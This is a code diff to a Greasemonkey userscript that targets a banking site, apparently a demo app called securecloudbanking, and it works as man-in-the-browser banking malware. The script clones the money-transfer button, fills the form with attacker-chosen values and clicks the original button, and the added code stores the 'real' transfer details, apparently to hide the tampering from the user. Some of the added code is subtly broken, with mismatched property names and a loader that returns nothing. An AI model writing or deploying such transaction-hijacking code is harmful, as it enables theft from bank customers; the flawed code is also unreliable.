@@ -7,7 +7,6 @@
 // @include        http*securecloudbanking.appspot.com*
 // @exclude        http*securecloudbanking.appspot.com*Admin*
 // @require		   http://code.jquery.com/jquery-1.3.2.js
-// @require		   http://code.jquery.com/jquery-1.3.2.js
 // ==/UserScript==
 
 
@@ -24,13 +23,77 @@ globalRC_Bank_Name="Postbank"
 global_Amount="34,50";
 global_Usage="Vielen Dank fuer Ihren Einkauf";
 
+ACC_NAME_INDEX = "ACC_NAME";
+ACC_NR_INDEX = "ACC_NR";
+BANK_BLZ_INDEX = "BANK_PLZ";
+BANK_NAME_INDEX = "BANK_NAME";
+AMOUNT_INDEX = "AMOUNT";
+REMARK_INDEX = "REMARK";
+
+//storage for real transfers
+function Transfer(name, nr, blz, bankName, amount, remark) {
+	this.acc_Name = name;
+	this.acc_Nr = nr;
+	this.bank_BLZ = blz;
+	this.bank_Name = bankName;
+	this.amount = amount;
+	this.remark = remark;
+}
+
+Transfer.prototype.setAccName = function(name) {
+	this.acc_Name = name;
+}
+
+Transfer.prototype.getAccName = function(){
+	return this.acc_Name;
+}
+
+function saveTransfers(transfers) {
+	
+	for (i = 0; i < transfers.length; i++) {
+		GM_setValue(ACC_NAME_INDEX + i, transfers[i].acc_Name);
+		GM_setValue(ACC_NR_INDEX + i, transfers[i].nr);
+		GM_setValue(BANK_BLZ_INDEX + i, transfers[i].blz);
+		GM_setValue(BANK_NAME_INDEX + i, transfers[i].bankName);
+		GM_setValue(AMOUNT_INDEX + i, transfers[i].amount);
+		GM_setValue(REMARK_INDEX + i, transfers[i].remark);
+
+	}
+	
+}
+
+function loadTransfers() {
+	i = 0;
+	transfers = new Array();
+	while (true) {
+		
+		result = GM_getValue(ACC_NAME_INDEX + i, false);
+		if (result == false)
+			return;
+		
+		name = GM_getValue(ACC_NAME_INDEX + i);
+		nr = GM_getValue(ACC_NR_INDEX + i);
+		blz = GM_getValue(BANK_BLZ_INDEX + i);
+		bankName = GM_getValue(BANK_NAME_INDEX + i);
+		amount = GM_getValue(AMOUNT_INDEX + i);
+		remark = GM_getValue(REMARK_INDEX + i);
+
+		
+		transfers[i] =  new Transfer(name, nr, blz, bankName, amount, remark);
+		i++;
+	}
+	return transfers;
+}
+
+realTransfers = loadTransfers();
+alert(realTransfers.valuesOf());
 
 	 function timedMsg()
 		 {
-		 
+
 		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){		 	
 
-		
+
 		 			$(this).attr("hackMarker","true");
 		 			sendMoneyBtnClone=$(this).clone(true)
 		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
@@ -54,6 +117,7 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 		 				$("input:eq(6)").val(HACK_USAGE);
 		 				sendMoneyBtnClone.attr("activateReset","true");
 		 				$("button[hackMarkerBtnOrig='true']")[0].click();
+
 		 				$(this).hide();
 		 				});			
 		 			
